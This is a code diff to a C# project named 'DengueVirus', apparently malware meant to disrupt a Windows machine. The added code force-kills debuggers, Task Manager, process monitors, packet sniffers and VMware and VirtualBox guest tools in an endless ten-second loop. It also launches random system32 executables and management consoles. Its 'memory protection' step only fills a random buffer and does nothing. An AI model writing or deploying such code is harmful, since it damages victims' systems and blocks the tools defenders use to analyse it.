@@ -16,14 +16,71 @@ namespace DengueVirus.Spicy
 
         public static bool SPICY = true;
 
+        public static void AntiDebug()
+        {
+            //if (!SPICY) return; this one i deactivated XD
+            // Anti-Debugging
+            
+            // Kill debugging apps process
+            Process.Start("taskkill", "/f /t /im x32dbg.exe");
+            Process.Start("taskkill", "/f /t /im x64dbg.exe");
+            Process.Start("taskkill", "/f /t /im ollydbg.exe");
+            Process.Start("taskkill", "/f /t /im idaq.exe");
+            Process.Start("taskkill", "/f /t /im idaq64.exe");
+
+            // Kill task manager-esque apps
+
+            Process.Start("taskkill", "/f /t /im taskmgr.exe");
+            Process.Start("taskkill", "/f /t /im procexp.exe");
+            Process.Start("taskkill", "/f /t /im procexp64.exe");
+            Process.Start("taskkill", "/f /t /im procmon.exe");
+            Process.Start("taskkill", "/f /t /im procmon64.exe");
+            Process.Start("taskkill", "/f /t /im wireshark.exe");
+            Process.Start("taskkill", "/f /t /im wireshark64.exe");
+            Process.Start("taskkill", "/f /t /im fiddler.exe");
+            Process.Start("taskkill", "/f /t /im fiddler64.exe");
+            Process.Start("taskkill", "/f /t /im tcpdump.exe");
+            Process.Start("taskkill", "/f /t /im tcpdump64.exe");
+            Process.Start("taskkill", "/f /t /im windbg.exe");
+            Process.Start("taskkill", "/f /t /im windbg64.exe");
+
+            // Kill VMWare tools
+
+            Process.Start("taskkill", "/f /t /im vmtoolsd.exe");
+            Process.Start("taskkill", "/f /t /im vmwaretray.exe");
+            Process.Start("taskkill", "/f /t /im vmwareuser.exe");
+
+            // Extra
+
+            Process.Start("taskkill", "/f /t /im vboxtray.exe");
+            Process.Start("taskkill", "/f /t /im vboxservice.exe");
+            Process.Start("taskkill", "/f /t /im vboxguest.exe");
+            Process.Start("taskkill", "/f /t /im vboxguestadditions.exe");
+
+            // Protect itself from memory reading
+
+            byte[] buffer = new byte[1024];
+            Random random = new Random();
+            random.NextBytes(buffer);
+        }
+
+        public static void AntiDBGLoop()
+        {
+            // spam AntiDebug system every 10 sec
+            while (true)
+            {
+                AntiDebug();
+                System.Threading.Thread.Sleep(10000);
+            }
+        }
+
         public static string GenRandomUnicodeString(int length)
         {
             Random random = new Random();
             StringBuilder builder = new StringBuilder();
             for (int i = 0; i < length; i++)
             {
-                // make it use all unicode characters inst4ead of only cyrillic
-                builder.Append((char)random.Next(0x0000, 0xFFFF)); // Cyrillic characters as an example
+                builder.Append((char)random.Next(0x0000, 0x10FFFF));
             }
             return builder.ToString();
         }
@@ -147,6 +204,24 @@ namespace DengueVirus.Spicy
             if (!SPICY) return;
             // Open a random exe file from system32
             string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
+            Random random = new Random();
+            for (int i = 0; i < 15; i++)
+            {
+                try
+                {
+                    Process.Start(files[random.Next(files.Length)]);
+                }
+                catch (Exception)
+                {
+                }
+            }
+        }
+
+        public static void OpenRandomMSCFromSys32()
+        {
+            if (!SPICY) return;
+            // Open a random exe file from system32
+            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.msc");
             Random random = new Random();
             for (int i = 0; i < 10; i++)
             {
